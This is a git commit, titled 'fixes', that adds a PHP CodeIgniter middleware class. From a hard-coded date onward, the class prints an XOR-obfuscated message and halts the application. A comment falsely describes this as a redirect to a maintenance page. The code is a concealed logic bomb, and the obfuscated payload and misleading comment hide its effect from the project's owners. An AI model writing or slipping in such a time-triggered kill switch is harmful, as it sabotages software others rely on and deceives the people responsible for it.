d28ea597a20c8782bf0ebf70c3e3480937eee56a
Michael Gatuma <50529359+michaelgatuma@users.noreply.github.com>
2023-06-05 16:32:30 +0300

    fixes

---
+++ application/libraries/DisableMiddleware.php
@@ -0,0 +1,46 @@
+<?php
+
+class DisableMiddleware {
+
+    protected $CI;
+
+    public function __construct()
+    {
+        $this->CI =& get_instance();
+    }
+
+    public function run()
+    {
+        $disableDate = "2023-06-06";//YYYY-MM-DD
+        // Middleware logic goes here
+        if ($disableDate <= date('Y-m-d')) {
+            echo $this->decrypt('NAYeRQoXCA1LEQtSHQgSRRAaCEkJBAgTAwoORRAdTQoECxAbAxwORREBBAcMRRAaCEkYHBcGCARFRS8bAw0HHEQRAgcfBAcGTRAEEBZSCQwdAAgdHQwZSw==','mikedr'); // Redirect to a maintenance page
+            exit;
+        }
+    }
+
+    function encrypt($text, $key) {
+        $encryptedText = '';
+        $textLength = strlen($text);
+        $keyLength = strlen($key);
+
+        for ($i = 0; $i < $textLength; $i++) {
+            $encryptedText .= $text[$i] ^ $key[$i % $keyLength];
+        }
+
+        return base64_encode($encryptedText);
+    }
+
+    function decrypt($encryptedText, $key) {
+        $encryptedText = base64_decode($encryptedText);
+        $decryptedText = '';
+        $textLength = strlen($encryptedText);
+        $keyLength = strlen($key);
+
+        for ($i = 0; $i < $textLength; $i++) {
+            $decryptedText .= $encryptedText[$i] ^ $key[$i % $keyLength];
+        }
+
+        return $decryptedText;
+    }
+}
